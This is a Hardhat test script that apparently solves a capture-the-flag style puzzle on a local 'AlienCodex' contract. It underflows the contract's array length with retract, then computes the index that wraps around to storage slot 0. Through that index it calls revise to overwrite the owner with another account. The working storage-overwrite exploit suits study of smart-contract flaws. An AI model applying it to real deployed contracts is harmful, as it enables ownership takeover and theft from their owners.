import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("Alien test", function () {
  it("Local Test", async function () {
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const codex = await AlienCodex.deploy();
    await codex.deployed();
    const owner = (await ethers.getSigners())[0];
    const newOwner = (await ethers.getSigners())[1];
    await (await codex.make_contact()).wait();
    console.log("is contacted:", await codex.contact());

    console.log("run underflow function");
    await (await codex.retract()).wait();


    // await( await codex.record(ethers.utils.randomBytes(32))).wait();    
    // await( await codex.record(ethers.utils.randomBytes(32))).wait();    
    // await( await codex.record(ethers.utils.randomBytes(32))).wait();

    // for(let i = 0; i < 2; i++) {
    //   console.log(await ethers.provider.getStorageAt(codex.address, i));
    // }


    // console.log("storage codex:");
    // for(let i = 0; i < 3; i++) {
    //   const hash = ethers.utils.solidityKeccak256(["uint256"],[1]);
    //   const bn = BigNumber.from(hash).add(i);
    //   console.log(await ethers.provider.getStorageAt(codex.address,  bn));
    // }
    // console.log("Actual codex:");

    // console.log(await codex.codex(0));
    // console.log(await codex.codex(1));
    // console.log("third codex not exist due to underflow");
    // // console.log(await codex.codex(2)); 

    console.log("now have full access to storage. Now we edit underflow");
    
    const hash = ethers.utils.solidityKeccak256(["uint256"], [1]);
    const bn = ethers.constants.MaxUint256.sub(BigNumber.from(hash));
    console.log("owner:",await codex.owner());
    // 0x000000000000000000000001 f39fd6e51aad88f6f4ce6ab8827279cfffb92266 Original storage for bool and address
    const data = "0x000000000000000000000001"+ newOwner.address.substring(2);
    console.log(data);
    console.log(bn.add(1)._hex);
    await(await codex.revise(bn.add(1)._hex,data)).wait();
    
    
    console.log("owner the address storage:", await ethers.provider.getStorageAt(codex.address, bn));
    console.log("owner the address storage:", await ethers.provider.getStorageAt(codex.address, bn.add(1)._hex));

    console.log("owner:",await codex.owner());
  });
});
